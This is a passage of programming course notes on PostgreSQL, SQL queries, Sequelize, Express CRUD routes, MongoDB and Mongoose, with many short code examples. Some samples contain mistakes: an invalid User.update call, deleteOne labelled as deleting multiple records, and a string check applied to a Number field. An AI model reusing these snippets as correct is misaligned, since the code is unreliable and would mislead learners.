('Alexis', 'Hot Tamales', 12);
```

## References  

* `CREATE TABLE` [documentation](https://www.postgresql.org/docs/current/static/sql-createtable.html)

* [PostgreSQL data types](https://www.postgresql.org/docs/current/static/datatype.html)

---

[SQL: Introduction](SQLIntroduction.md)

# Exporting and importing PostgreSQL databases  

## Terminology  

* *schema*: the structure of a database's tables and other objects

## Examples  

Dumping a database:

```
pg_dump --no-owner [dbname] > dump.sql
```

If students have not yet learned about shell redirection, this may be a good place to teach that.

Dumping a database with `DROP TABLE` statements:

```
pg_dump --no-owner --clean [dbname] > dump.sql
```

Dumping just the data:

```
pg_dump --data-only [dbname] > dump.sql
```

Dumping just the schema:

```
pg_dump --no-owner --schema-only [dbname] > dump.sql
```

Restoring any of these:

psql [dbname] < dump.sql

## References  

[pg_dump documentation](https://www.postgresql.org/docs/9.6/static/app-pgdump.html)

---

[SQL: Introduction](SQLIntroduction.md)

# SQL Statements  

## Terminology  

* *SQL*: Structured Query Language. A declarative programming language for defining databases and extracting and manipulating information from them.

* *predicate*: a Boolean (true/false) statement, often used to refer to the WHERE clause of SQL statements

## Filtering records using WHERE clauses  

* `WHERE` is an SQL filter

  * The `WHERE` clause in a `SELECT` statement describes the rows from the source tables that are used to build the result set.

  * The `WHERE` clause in an `UPDATE` or `DELETE` statement narrows the rows that will be affected.

  * It sets a series of conditions and only the rows that meet the conditions are used to build a result set.

  * Comparison operators can be used, such as `=`, `< >`, `<`, and `>`

  * `IS NULL` and `IS NOT NULL` can be used to get only rows where a column is null or not null

  * Boolean and parentheses operators can be used to bind multiple expressions: `AND`, `OR`

* `ORDER BY` can be used to arrange the order of the results

* `LIMIT` and `OFFSET` can be used to get a subset of the results

## Examples  

```
SELECT * FROM students;
SELECT name, favorite_color FROM students;

-- Find all graduated students
SELECT name, cohort FROM students WHERE graduate = 't';
-- Find all current students
SELECT name, cohort FROM students WHERE graduate = 'f';

-- Find all the students with no email
SELECT name FROM students WHERE email IS NULL;
SELECT name, email FROM students WHERE email IS NOT NULL;

-- Find students with no favorite color and no height
SELECT name FROM students WHERE favorite_color IS NULL AND height_cm IS NULL;

-- Students from shortest to tallest
SELECT name, height_cm FROM students ORDER BY height_cm;
-- Students from tallest to shortest
SELECT name, height_cm FROM students ORDER BY height_cm DESC;
-- Get rid of the nulls
SELECT name, height_cm FROM students WHERE height_cm IS NOT NULL ORDER BY height_cm DESC;

-- 10 tallest students
SELECT name FROM students ORDER BY height_cm DESC LIMIT 10;

-- Graduate cohort 11.
UPDATE students SET graduated = 't' WHERE cohort = 11;

-- set favorite color to yellow if null
UPDATE students SET favorite_color = 'yellow' WHERE favorite_color IS NULL;

-- Delete all students without an email.
DELETE FROM students WHERE email IS NULL;

-- Remove students over 7 feet tall
DELETE FROM students WHERE height_cm >= 213.36;
```

## References  

* [Intro to SQL on Khan Academy](https://www.khanacademy.org/computing/computer-programming/sql)

* [PostgreSQL SELECT documentation](https://www.postgresql.org/docs/9.6/static/sql-select.html)

* [PostgreSQL UPDATE documentation](https://www.postgresql.org/docs/9.6/static/sql-update.html)

* [PostgreSQL DELETE documentation](https://www.postgresql.org/docs/9.6/static/sql-delete.html)

---

[Sequelize: Introduction](SequelizeIntroduction.md)

# Create models with Sequelize  

## Terminology  

* *ORM*: stands for Object-Relational Mapper. Provides a way to access a database from your program while treating your database as an object and individual rows as objects.

* *model*: an object that holds data and is responsible for saving and updating its associated database record.

* *migration*: a file that programmatically alters your database schema.

## Setting up Sequelize  

Make sure you have run `npm install -g sequelize-cli`!

1. `cd` into a directory with an Express app.

2. Run `npm install sequelize pg --save`. `pg` is the library for using PostgreSQL.

3. Run `sequelize init`. This will create the `config`, `migrations`, `seeders`, and `models` directories.

4. Edit `config/config.json`. The dialect should be `"postgres"` and the username should be your local username. Change the database names to reflect the actual project.

5. Create the development database using `createdb` on the command line.

6. Run `sequelize db:migrate` to test your connection.

**Note**: At this time, `pg` gives a deprecation notice with `sequelize`. This is nothing to worry about.

## Creating a model  

To create a model with Sequelize, you run `sequelize model:create` on the command line with a set of flags. As an example, to create a `User` model with a name, an email, and a bio:

```
sequelize model:create --name User --attributes 'name:string email:string bio:text'
```

The types specified here are named differently than PostgreSQL calls them. See ["Data Types"](http://docs.sequelizejs.com/manual/tutorial/models-definition.html#data-types) to get a full list. While these are upper-cased in the documentation, they can be lower-case on the command line. Options passed to them, like `Sequelize.TEXT('tiny')`, will have to be edited in the generated migration.

Run `sequelize db:migrate` to run the migration and update your database.

References  

* [Getting started with Sequelize](http://docs.sequelizejs.com/manual/installation/getting-started.html)

* ["Data types" in Model definition](http://docs.sequelizejs.com/manual/tutorial/models-definition.html)

* [Migrations](http://docs.sequelizejs.com/manual/tutorial/migrations.html)

---

[Sequelize: Introduction](SequelizeIntroduction.md)

# Use Sequelize models  

## Terminology  

* *promise*: an alternative to callbacks for handling asynchronous code. See **[Why Promises?](http://bluebirdjs.com/docs/why-promises.html)**

## Examples  

### Requiring models  

To require a model, `const models = require("./models")` and use the `models` object to access the model, like so:

```js
const models = require("./models");
models.User.findOne().then(function (user) {
  console.log(user);
})
```

If you try to require the model file directly (like `require("./models/user")`), you will get a function, not your model class.

### Building and saving model instances  

To build an unsaved instance:

```js
const todo = models.Todo.build({
  title: 'Finish writing learning objective',
  description: 'Sequelize has a lot of concepts to learn',
  deadline: new Date()
});
```

To save the instance, call `save`. If you want to do something with the saved instance, you will have to use `.then` on the returned value from `save`.

```js
todo.save().then(function (newTodo) {
  console.log(newTodo.id);
})
```

`todo` will be updated, but it is asynchronous, so there isn't a guarantee when that will happen. `save()` returns a promise.

`create` will build and save in one step. It is really easy to make a mistake with `create`, though: it returns a promise, not a model instance.

```js
// BAD
const todo = models.Todo.create({
  title: 'Finish writing learning objective',
  description: 'Sequelize has a lot of concepts to learn',
  deadline: new Date()
});
console.log(todo);

// output
// Promise {
//   _bitField: 67108864,
//   _fulfillmentHandler0: undefined,
// ...
```

### Querying for models  

#### Finding by attributes using findOne()

* Returns the first instance that matches the `where` clause.

* Returns `null` if not found.

```js
User.findOne({
  where: {
    username: 'kerry'
  }
}).then(function (user) {
  //Code here
});
```

#### Finding by id using findById()

* Returns only one instance.

* Returns `null` if not found.

* In this example, we use an id of 1234.

```js
User.findById(1234).then(function (user) {
  //Code here
})
```

#### Finding or creating an instance using findOrCreate()

* `spread`: spreads an array of values to parameters. Only used with `findOrCreate()`. Works like `then`, but makes it easier to work with multiple parameters.

```js
User.findOrCreate({
  where: {
    username: 'brody'
  },
  defaults: {
    email: 'brody@email.com'
  }
}).spread(function (user, created) {
  console.log(user.id, created);
});
```

#### Finding multiple instances using findAll()

* Returns *all* instances.

```js
User.findAll().then(function (users) {
  // code here
})
```

#### Search using specific attributes

* Returns *all* instances that match the `where` clause.

```js
User.findAll({
  where: {
    user_name: 'Dan',
  }
}).then(function (users) {
  // code here
});
```

#### Search using a range

* Returns an array containing instances specified in the range.

```js
User.findAll({
  where: {
    id: [1234, 1256, 1345]
  },
}).then(function (users) {
  // code here
});
```

#### Get a count

```js
User.count({
  where: { state: 'NC' }
}).then(function (count) {
  console.log(count);
})
```

### Limiting, Offsetting, and Ordering  

#### limit

```js
// Limit the results to 20.
User.findAll({ limit: 20 })
```

#### offset

```js
// Steps over the first 5 elements.
User.findAll({ offset: 5 })
```

#### offset and limit

```js
// Step over the first 15 elements, and limits it to 5
User.findAll({ offset: 15, limit: 5 })
```

#### order

```js
User.findAll({order: ['startDate']})
// Returns ORDER BY startDate

User.findAll({order: [['startDate', 'DESC']]})
// Returns ORDER BY startDate DESC
```

### Updating and Destroying Instances  

#### Updating an instance using update()

```js
User.update({
  email: 'awesomewinter@email.com',
  age: 34
}, {
  where: {
    user_name: 'winter',
  }
}).then(function (user){
  // Code here.
  // Do something after updating instance.
})
```

#### Deleting an instance using destroy()

```js
User.destroy({
  where: {
    user_name: 'ryan'
  }
}).then(function(){
  // Code here.
  // Do something after destroying instance.
});
```

---

[Sequelize: Introduction](SequelizeIntroduction.md)

# Express/Sequelize CRUD Operations  

## Terminology  

* *CRUD*: stands for create, read, update, and delete -- the four major actions you take on data through most web applications

## Examples  

Here is an example set of routes for a bookmarking application that show a list of links; let you add, edit, and delete links; and track the number of clicks on each link. You can find the entire application with discrete commits to see how it was built at [world-of-links](https://github.com/tiycnd/world-of-links).

```js
// index of all links
router.get("/links", function (req, res) {
    models.Link.findAll().then(function (links) {
        res.render("index", {
            links: links
        });
    });
});

// create form for link
router.get("/links/create", function (req, res) {
    res.render("form");
})

// create action for link
router.post("/links", function (req, res) {
    req.checkBody("title", "You must include a title.").notEmpty();
    req.checkBody("url", "Your URL is invalid.").isURL();

    const linkData = {
        title: req.body.title,
        url: req.body.url,
        descr: req.body.descr
    };

    req.getValidationResult().then(function (result) {
        if (result.isEmpty()) {
            models.Link.create(linkData).then(function (link) {
                res.redirect("/");
            });
        } else {
            const link = models.Link.build(linkData);
            const errors = result.mapped();
            res.render("form", {
                errors: errors,
                link: link
            })
        }
    })
});

// view link
router.get("/links/:linkId", function (req, res) {
    models.Link.findById(req.params.linkId).then(function (link) {
        if (link) {
            link.clicks += 1;
            link.save().then(function () {
                res.redirect(link.url);
            });
        } else {
            res.status(404).send('Not found.');
        }
    });
});

// edit form for link
router.get("/links/:linkId/edit", function (req, res) {
    models.Link.findById(req.params.linkId).then(function (link) {
        if (link) {
            res.render("form", {
                link: link,
                action: "/links/" + link.id,
                buttonText: "Update link"
            });
        } else {
            res.status(404).send('Not found.');
        }
    })
})

// edit action for link
router.post("/links/:linkId", function (req, res) {
    req.checkBody("title", "You must include a title.").notEmpty();
    req.checkBody("url", "Your URL is invalid.").isURL();

    const linkData = {
        title: req.body.title,
        url: req.body.url,
        descr: req.body.descr
    };

    models.Link.findById(req.params.linkId).then(function (link) {
        if (link) {
            req.getValidationResult().then(function (result) {
                if (result.isEmpty()) {
                    link.update(linkData).then(function (newLink) {
                        res.redirect("/");
                    });
                } else {
                    const errors = result.mapped();
                    res.render("form", {
                        link: linkData,
                        errors: errors,
                        action: "/links/" + link.id,
                        buttonText: "Update link"
                    });
                }
            });
        } else {
            res.status(404).send('Not found.');
        }
    })
});

// delete action for link
router.post("/links/:linkId/delete", function (req, res) {
    models.Link.findById(req.params.linkId).then(function (link) {
        if (link) {
            link.destroy().then(function () {
                res.redirect("/");
            })
        } else {
            res.status(404).send('Not found.');
        }
    })
});
```

## References  

[Sequelize Tutorial - Instances](http://docs.sequelizejs.com/manual/tutorial/instances.html)

---

[Sequelize: Advanced](SequelizeAdvanced.md)

# Associations: belongsTo, hasOne, hasMany, and belongsToMany  

## Terminology  

* *associations*: relationships between models.

* *source model*: the model defining an association

* *target model*: the model to which an association is being defined

* *foreign key*: a database column that contains references to another table

* *target key*: a database column that a foreign key references.

* Sequelize associations:

  * `belongsTo`: creates an association in which the foreign key for the relationship exists on the source model. Establishes a one-to-one or many-to-one relationship.

  * `hasMany`: creates an association in which the foreign key for the relationship exists on the target model. Establishes a one-to-many relationship.

  * `hasOne`: creates an association in which the foreign key for the relationship exists on the target model. Establishes a one-to-one relationship.

  * `belongsToMany`: creates an association in which there are two foreign keys on a third table. Establishes a many-to-many relationship.

## Examples  

### A migration adding a foreign key  

```js
// migrations/20170625173808-add-user-id-to-todo.js
'use strict';

module.exports = {
  up: function (queryInterface, Sequelize) {
    return queryInterface.addColumn(
      'Todos',
      'userId',
      {
        type: Sequelize.INTEGER,
        allowNull: false,
        references: {
          model: 'Users',
          key: 'id'
        }
      }
    )
  },

  down: function (queryInterface, Sequelize) {
    return queryInterface.removeColumn('Todos', 'userId');
  }
};
```

### Tables for examples  

The "users" table:

| id |	username |
| --- | --- |
| 1	| alexis |
| 2	| river |
| 3	| dorian |

The "todos" table:

| id	| userId	| text |
| --- | --- | :--- |
| 1	| 1	| Do homework |
| 2	| 1	| Feed cat |
| 3	| 3	| Plan vacation |

The "authors" table:

| id	| name	| userId |
| --- | :--- | --- |
| 1	| Alexis Tseng	| 1 |
| 2	| River Whitaker	| 2 |
| 3	| Dorian Ramirez	| 3 |

The "books" table:

| id	| title |
| --- | :--- |
| 1	| Vacation Planning for Type A Personalities |
| 2	| An Exploration of the Netherworld |

The "authors_books" table:

| id	| authorId	| bookId |
| --- | --- | --- |
| 1	| 1	| 1 |
| 2	| 2	| 1 |
| 3	| 3	| 2 |
| 4	| 1	| 2 |

```js
const User = this.sequelize.define('User', {/* attributes */});
const Todo  = this.sequelize.define('Todo', {/* attributes */});
const Author = this.sequelize.define('Author', {/* attributes */});
const Book  = this.sequelize.define('Book', {/* attributes */});

User.hasOne(Author, {foreignKey: 'userId'});
User.hasMany(Todo, {foreignKey: 'userId'});
Todo.belongsTo(User, {foreignKey: 'userId'});
Author.belongsTo(User, {foreignKey: 'userId'});
Author.belongsToMany(Book, {
  through: 'authors_books', foreignKey: 'authorId', otherKey: 'bookId'
});
Book.belongsToMany(Author, {
  through: 'authors_books', foreignKey: 'bookId', otherKey: 'authorId'
});
```

**NOTE**: The above associations would be distributed into their models' source file in associate methods, like so:

```js
// models/todo.js
'use strict';
module.exports = function(sequelize, DataTypes) {
  var Todo = sequelize.define('Todo', {
    body: {
      text: DataTypes.STRING,
      allowNull: false
    }
  }, {});

  Todo.associate = function (models) {
    Todo.belongsTo(models.User, {foreignKey: 'userId'});
  }
  return Todo;
};
```

---

[Sequelize: Advanced](SequelizeAdvanced.md)

# Author Model Class Methods, Attributes, And Instance methods  

## Model validation  

* Sequelize automatically runs validations on `create`, `update` and `save`.

* Validations are defined in the model's attribute definitions.

* Set `validate` as follows: `validate: validation-method`.

* [See complete list of validations.](http://docs.sequelizejs.com/manual/tutorial/models-definition.html#validations)

* Validations are implemented with [validator.js](https://github.com/chriso/validator.js). See that library for documentation on individual validations.

An example:

```js
var User = sequelize.define('user', {
  username: {
    type: Sequelize.STRING,
    unique: true,
    validate: {
      // Only allows letters.
      isAlpha: true
    }
  },
  email: {
    type: Sequelize.STRING,
    validate: {
      // Checks for email format (person@example.org)
      isEmail: true
    }
  }
});
```

## Handling validation and other errors  

When an error occurs in a Sequelize method that returns a promise (like `create` or `save`), you have to use a `catch` method to handle it. An example:

```js
// invalid username
User.create({username: "!!!", email: "a@example.org"}).then(function (user) {
  console.log(user);
}).catch(function (err) {
  console.log("Error", err);
})
// will log the error
```

You can handle specific types of errors by passing the error type as the first argument to `catch`.

```js
User.create({username: "me", email: "me@example.org"})

// creating a second one will cause a UniqueConstraintError
User.create({username: "me", email: "woot@example.org"}).then(function (user) {
  console.log(user);
}).catch(Sequelize.UniqueConstraintError, function (err) {
  console.log("Username not unique!");
}).catch(Sequelize.ValidationError, function (err) {
  console.log("Not valid!", err);
}).catch(function (err) {
  // handle all other errors
  console.log("Oh no!", err);
})
```

## Bulk methods  

### Create instances in bulk  

Use the `bulkCreate()` method to create multiple instances at once. An example:

```js
User.bulkCreate([{
    username: 'Emerson',
    role: 'admin',
    isActive: false
}, {
    username: 'Grey',
    role: 'user',
    isActive: true
}, {
    username: 'Keelan',
    role: 'admin',
    isActive: true
}]).then(function() {
    return User.findAll();
}).then(function(users){
    console.log(users) // Returns an array of user objects.
});
```

### Validating bulk insertions  

* Set `validate` attribute to `true` as a second option of the `createBulk()` method.

* The `validate` attribute must also be set in the model.

An example:

```js
// Define model.
// Set validation.
User.bulkCreate([{
    username: 'john.smith',
    email: 'john.smith@email.com'
}, {
    username: 'mary.connor',
    email: 'mary.connor'
}], {
    validate: true
}).catch(function(errors) {
    console.log(errors);
})
```

### Update instances in bulk  

* Use the `update()` in conjunction with an attribute(s) to be updated and a `where` clause to update many instances at once.

```js
User.update({
  { isActive: 'true'}, // Set attribute value for update.
  { where: { user_role: 'admin'}}
}).spread(function (affectedCount, affectedRows) {
  // Returns two values in an array.
  return User.findAll();
}).then(function (users) {
  // Do something with users
})
```

### Delete instances in bulk  

* Use the `destroy()` in conjunction with the `where` clause to delete many instances at once.

```js
User.destroy({
  where: {
    user_role: 'user'
  },
  truncate: true // Ignores the where clause and truncates the table.
}).then(function (affectedRows) {
  return User.findAll();
}).then(function (users) {
  // Do something with users.
});
```

## Defining Instance Methods  

* Instance methods add functionality to models.

* To add them, we assign them to the model's *prototype*.

* In this example we include a `fullEmail` function so that it is available in all instances of the model.

```js
'use strict';
module.exports = function(sequelize, DataTypes){
  var User = sequelize.define('user', {
    username: Sequelize.STRING,
    email: Sequelize.STRING
  }, {});
  User.prototype.fullEmail = function () {
    return `${this.username} <${this.email}>`;
  }
  return User;
};
```

* Use `this` to gain access to the method.

```js
User.create({
  username: 'cadence',
  email: 'cadence@example.org'
}).then(function(user){
  console.log(user.fullEmail()); //Prints 'cadence <cadence@example.org>'
});
```

---

[NoSQL: MongoDB](NoSQLMongoDB.md)

# Installing and setting up MongoDB  

## Terminology  

* *NoSQL*: a blanket name for databases that are not relational and do not use SQL

* *MongoDB*: a document database. Stores data in a JSON-like format. Uses JavaScript for queries.

## Examples  

This example shows how to connect to MongoDB, create a database, and delete it.

```
$ mongo
MongoDB shell version v3.4.4
connecting to: mongodb://127.0.0.1:27017
MongoDB server version: 3.4.4
> use testdb
switched to db testdb
> db
testdb
> db.dropDatabase()
{ "ok" : 1 }
```

## References  

* [MongoDB docs](https://docs.mongodb.com/)

---

[NoSQL: MongoDB](NoSQLMongoDB.md)

# MongoDB databases, collections, and documents  

## Terminology  

* *database*: (in MongoDB) a storage area for collections

* *collection*: a named set of documents, analogous to a table in a relational database

* document*: a JSON-like object with keys and values, analogous to a row in a relational database

## How does MongoDB differ from PostgreSQL?  

* There is no schema. You can store freeform data in the database.

* There is no easy way to join data from multiple collections, unlike in a relational database, where you can join multiple tables.

## Can I really store anything in MongoDB?  

Not exactly. There is a [formal list of what you can store](https://docs.mongodb.com/manual/reference/bson-types/), but for all purposes, you can store whatever you could use in a JSON object.

---

[NoSQL: MongoDB](NoSQLMongoDB.md)

# Importing and exporting data from MongoDB  

## Vocabulary  

* *JSON*: JavaScript Object Notation. A restricted version of object literals and JavaScript. Used for MongoDB exports.

* *BSON*: [Binary JSON](https://en.wikipedia.org/wiki/BSON), the format used by MongoDB internally. Can store more types than JSON.

## Importing and exporting from MongoDB  

```
$ mongoimport --db databaseName --collection collectionName --file inputFile.json
2017-06-28T23:34:57.090-0400    connected to: localhost
2017-06-28T23:34:58.550-0400    imported 25359 documents

$ mongoexport --db databaseName --collection collectionName --out outputFile.json
2017-06-28T23:35:53.000-0400    connected to: localhost
2017-06-28T23:35:54.001-0400    [........................]  newdb.restaurants  0/25359  (0.0%)
2017-06-28T23:35:55.004-0400    [###############.........]  newdb.restaurants  16000/25359  (63.1%)
2017-06-28T23:35:55.452-0400    [########################]  newdb.restaurants  25359/25359  (100.0%)
2017-06-28T23:35:55.452-0400    exported 25359 records
```

---

[NoSQL: MongoDB](NoSQLMongoDB.md)

# MongoDB Operations   

## Examples  

* Review connecting to MongoDB and selecting a database.

* Show how to find many documents or a single document.

* Show how to filter your search based on document fields, including nested fields.

* Show how to insert documents.

* Show how to update documents.

* Show how to delete documents.

* Show how to call the same Mongo commands from Node.

All the below examples were written using the provided sample database. To import the database, run:

```
curl -o primer-dataset.json https://raw.githubusercontent.com/mongodb/docs-assets/primer-dataset/primer-dataset.json
mongoimport --db newdb --collection restaurants --file primer-dataset.json
```

### Setting the default number of records to show at once  

```
> DBQuery.shellBatchSize = 4
```

### Finding all documents  

```js
db.restaurants.find()
```

### Finding one document  

```js
db.restaurants.findOne()
```

### Filtering records while finding  

Use a *[query filter document](https://docs.mongodb.com/manual/core/document/#document-query-filter)* to filter records.

```js
db.restaurants.find({name: "Wendy'S"})
db.restaurants.find({cuisine: "Chinese", borough: "Brooklyn"})
db.restaurants.find({cuisine: {$in: ["Chinese", "Thai", "Vietnamese"]}})
db.restaurants.find({cuisine: {$in: ["Thai", "Vietnamese"]}})
```

See [all the MongoDB query operators](https://docs.mongodb.com/manual/reference/operator/query/#query-selectors).

You can sort by calling `.sort` on the results with an object of fields to sort by:

```js
db.restaurants.find({cuisine: {$in: ["Thai", "Vietnamese"]}}).sort({"name": 1})
```

`1` means to sort ascending, `-1` means to sort descending. The order of keys in the object is preserved, so you can specify multiple fields and it will sort in order.

```js
db.restaurants.find({cuisine: {$in: ["Thai", "Vietnamese"]}}).sort({"borough": 1, "name": 1})
```

### Filtering using nested documents  

You can use *dot notation* to search inside nested documents.

```js
db.restaurants.find({"address.zipcode": "11218"});
```

If you want to search for all documents based off an array value, you can reference the array like normal and you will get all records where *any* value in the array matches.

```js
// Find all restaurants that have ever gotten a C score.
db.restaurants.find({"grades.grade": "C"})
```

To get records where all values in the array match, you have to get tricky. Here's one to get all restaurants that have only ever had "A" scores:

```js
db.restaurants.find({"grades.grade": {$not: {$in: ["B", "C", "Z"]}}});
```

To understand how this works, step through it:

1. `$in` matches values that are in the array `["B", "C", "Z"]`. This will bring back records where any `grade` in the array `grades` returns true for this test.

2. This brings back all records where the restaurant has ever gotten a "B", "C", or "Z" (the only grades outside of "A" I saw.)

3. `$not` gives us the opposite of that -- all records that the `$in` didn't match.

4. So, we get all records where no `grades.grade` was "B", "C", or "Z".

You can simplify the above a little:

```js
db.restaurants.find({"grades.grade": {$nin: ["B", "C", "Z"]}});
```

You can reference specific elements of an array using dot notation. To find all restaurants where their last grade was an "A" (assuming that the grades are in descending order by date):

```js
db.restaurants.find({"grades.0.grade": "A"});
```

### Inserting documents  

When you insert a document, it will be given a unique `_id` unless you provide one.

```js
// This will insert a new document. The result object contains two values,
// `acknowledged` and `insertedId`. `insertedId` lets us look up the document
// we inserted.
var result = db.restaurants.insertOne({
  "address": {"building": "100", "street": "Fiction St", "zipcode": "00001" },
  "borough": "Yonkers", "cuisine": "Awesome",
  "grades": [
    { "date": ISODate("2017-06-01T00:00:00Z"), "grade": "A+", "score": 0 }
  ],
  "name": "Favorite Delights", "restaurant_id": "1"})
db.restaurants.findOne({"_id": result.insertedId})
```

`insertMany` can insert more than one document at a time:

```js
db.restaurants.insertMany([{
  "address": {"building": "100", "street": "Fiction St", "zipcode": "00001" },
  "borough": "Yonkers",
  "cuisine": "Awesome",
  "grades": [
    { "date": ISODate("2017-06-01T00:00:00Z"), "grade": "A+", "score": 0 }
  ],
  "name": "Favorite Delights",
  "restaurant_id": "1"
}, {
  "address": {"building": "101", "street": "Fiction St", "zipcode": "00001" },
  "borough": "Yonkers",
  "cuisine": "Garbage",
  "grades": [
    { "date": ISODate("2017-06-01T00:00:00Z"), "grade": "C", "score": 50 }
  ],
  "name": "Garbage Delights",
  "restaurant_id": "2"}])
```

### Creating a unique index  

You will have fields in your documents that you want to ensure are unique. To do this, you need to [create a unique index](https://docs.mongodb.com/manual/core/index-unique/#index-type-unique).

```js
// Ensure restaurant_id is unique.
db.restaurants.createIndex( { "restaurant_id": 1 }, { unique: true } )
```

You can see your collection's indexes like so:

```js
db.restaurants.getIndexes()
```

### Updating documents  

There are two main functions to update documents, `updateOne` and `updateMany`. Each of these take a filter -- like we used with `find` -- and an object made of [update operators](https://docs.mongodb.com/manual/reference/operator/update/). These operators tell us how to manipulate the document.

Some examples:

```js
// Add city and state to all addresses
db.restaurants.updateMany({},
  {$set: {"address.city": "New York", "address.state": "NY"}});

// Add a new review to one restaurant
// We can use new Date() because the Mongo shell uses JavaScript.
db.restaurants.updateOne({restaurant_id: "30191841"},
  {$push: {grades: {"grade": "A", "score": 7, "date": new Date()}}});

// Add a new review to one restaurant and keep them in order
db.restaurants.updateOne({restaurant_id: "30191841"},
  {$push: {grades: {
    $each: [{"grade": "A", "score": 7, "date": new Date()}],
    $sort: {"date": -1}}}})

// Fix an error in data entry across multiple documents
db.restaurants.updateMany({"address.street": "West   57 Street"},
  {$set: {"address.street": "West 57 Street"}})
```

You can also upsert documents. *Upsert* means to update if records are found, or insert a document if they are not found. Add a third object of options with `upsert` equal to true to do so.

```js
db.restaurants.updateOne(
  {restaurant_id: "99"},
  {
    $set: {name: "Spaniel's Place"},
    $push: {grades: {"grade": "A", "score": 7, "date": new Date()}}
  },
  {upsert: true}
);
```

Your search parameters must be unique for an upsert to work.

### Deleting records  

To delete records, use `deleteOne` or `deleteMany`. These take a query like `find` and `findOne`.

```js
// Delete restaurant id 99
db.restaurants.deleteOne({restaurant_id: "99"})

// Delete all restaurants in Manhattan which is not a real borough
db.restaurants.deleteMany({"borough": "Manhattan"})

// Delete all restaurants
db.restaurants.deleteMany({})
```

### Using MongoDB from Node  

All the commands we have run so far run inside the MongoDB shell, but you can run them from Node, too. To do so, install the Node MongoDB library:

```
npm install mongodb --save
```

The majority of method names are the same, but instead of directly returning data, they take callbacks, or if you don't provide a callback, return promises. See the [Node.js MongoDB quickstart](http://mongodb.github.io/node-mongodb-native/2.2/quick-start/quick-start/) to see it in action.

## References  

* [MongoDB shell quickstart](https://docs.mongodb.com/getting-started/shell/)

* [Node.js MongoDB quickstart](http://mongodb.github.io/node-mongodb-native/2.2/quick-start/quick-start/)

* [Query operators](https://docs.mongodb.com/manual/reference/operator/query/#query-selectors)

* [Update operators](https://docs.mongodb.com/manual/reference/operator/update/)

---

[MongoDB with Mongoose](MongoDBMongoose.md)

# Schemas and Models with Mongoose  

## Terminology  

* *schema* (for Mongoose): A schema defines the shape of your data to be stored in MongoDB, along with rules about that data. A Mongoose schema is different than a SQL schema in that it's an app-level definition of your data structure, not imposed by the database.

## Examples  

### Connecting to MongoDB with Mongoose  

Install Mongoose and Bluebird via NPM:

```
npm install mongoose@4.10.8 bluebird --save
```

**NOTE**: Make sure to use the version number above. Version 4.11 will not work and will cause problems.

Then in `app.js`:

```js
const mongoose = require('mongoose');
mongoose.Promise = require('bluebird');
// Replace "test" with your database name.
mongoose.connect('mongodb://localhost:27017/test');
```

### Creating a schema and model  

```js
// models/recipe.js
const mongoose = require('mongoose');

const recipeSchema = new mongoose.Schema({
    name: { type: String, required: true, unique: true },
    prepTime: Number,
    cookTime: Number,
    ingredients: [{
        amount: { type: Number, required: true, default: 1 },
        measure: { type: String, lowercase: true, trim: true },
        ingredient: { type: String, required: true }
    }],
    steps: [String],
    source: {type: String}
})

const Recipe = mongoose.model('Recipe', recipeSchema);

module.exports = Recipe;
```

### Making an instance of your model  

```js
var recipe = new Recipe({name: "Pancakes"});
recipe.ingredients.push({ingredient: 'sugar', measure: " Tbsp"});
console.log(recipe.toObject());
// { name: 'Pancakes',
//   _id: 59553335625ccdda459e09b4,
//   steps: [],
//   ingredients:
//    [ { ingredient: 'sugar',
//        measure: 'tbsp',
//        _id: 59553335625ccdda459e09b5,
//        amount: 1 } ] }
```

## References  

* [Mongoose.js](http://mongoosejs.com/)

* [MDN Express Tutorial - Part 3 - Using Mongoose](https://developer.mozilla.org/en-US/docs/Learn/Server-side/Express_Nodejs/mongoose)

---

[MongoDB with Mongoose](MongoDBMongoose.md)

# Create, query, update, and delete models with Mongoose  

## Examples  

Creating an unsaved model:

```js
const recipe = new Recipe({name: "Pancakes", source: "Grandma"});
recipe.save()
  .then(function () {
    // actions to take on success
  })
  .catch(function () {
    // handle error
  })
```

Creating a model and saving in one command:

```js
Recipe.create({name: "Pancakes"})
  .then(handleSuccess)
  .catch(handleError);
```

Finding one record:

```js
Recipe.findOne({name: "Pancakes"})
  .then(handleSuccess)
  .catch(handleError);
```

Finding multiple records:

```js
Recipe.find({cookTime: {$gt: 15, $lt: 60}})
  .then(handleSuccess)
  .catch(handleError);
```

Complex queries:

```js
Recipe.find({source: "Grandma"})
  .where('cookTime').lt('30') // only cookTimes < 30
  .where({ingredients: {
    $lt: {$size: 5}}}) // only recipes with less than 5 ingredients
  .limit(10) // only 10 recipes
  .skip(5) // skip the first five
  .sort("-cookTime") // sort by cookTime descending
  .select("name cookTime") // only return name and cookTime
```

Updating one model:

```js
Recipe.updateOne({source: "Grandma"},
  {$push: {steps: "Call Grandma and tell her how it was."}})
```

Updating multiple models:

```js
Recipe.updateMany({source: "Grandma"},
  {$push: {steps: "Call Grandma and tell her how it was."}})
```

Deleting one model:

```js
Recipe.deleteOne({name: "Green Bean Casserole"})
```

Deleting multiple models:

```js
Recipe.deleteOne({prepTime: {$gt: 60}})
```

## References  

* [Mongoose docs](http://mongoosejs.com/docs/guide.html)

---

[MongoDB with Mongoose](MongoDBMongoose.md)

# Validating models with Mongoose  

### Mongoose Validation  

* Used to validate model instances

* Defined in the SchemaType

* Middleware construct

  * runs before save with a `pre('save')` hook on every schema
  
* Can be called manually

  * `doc.validate(callback)`

  * `doc.validateSync()`

* Can be customized

### Built-in Validators  

* `required` properties are checked before saving. Their values must be present.

* `min` values can be required of `Number` property types

* `max` values can be required of `Number` property types

* `enum` values can be required of `String` property types

* `match` values can be required of `String` property types

* `maxLength` values can be required of `String` property types

* `minLength` values can be required of `String` property types

*** Custom Validators  

* Can be added to a model property with the `validate` property

* The `validate` property expects either a function value or an array containing a function and an error message

* The `validate` function accepts the value of the model property as it's argument, allowing you to validate the value of the model property and return a boolean value

> `unique` is a helper, not a validator

## Examples  

```js
const recipeSchema = new mongoose.Schema({
  // Using the `required` validator
  name: { type: String, required: true, unique: true },
  prepTime: {
    type: Number,
    // Using the `min` validator
    min: [1, 'Some prep time must be considered']
  },
  cookTime: {
    type: Number,
    // Using a custom validator and message
    validate: [ function(val) {
        // Get the last three characters of the value
        const lastThreeChars = val.substr(val.length - 3);
        return lastThreeChars === 'min'
      // Custom error message
      }, 'No good, {PATH} should be in minutes ("min")'
    ]
  },
  ingredients: [{
     amount: { type: Number, required: true, default: 1 },
     measure: { type: String, lowercase: true, trim: true },
     ingredient: { type: String, required: true }
  }],
  steps: [String],
  source: {type: String}
})

const Recipe = mongoose.model('Recipe', recipeSchema);


// This recipe has no name and no prepTime
var recipe = new Recipe();

recipe.save(function(error) {
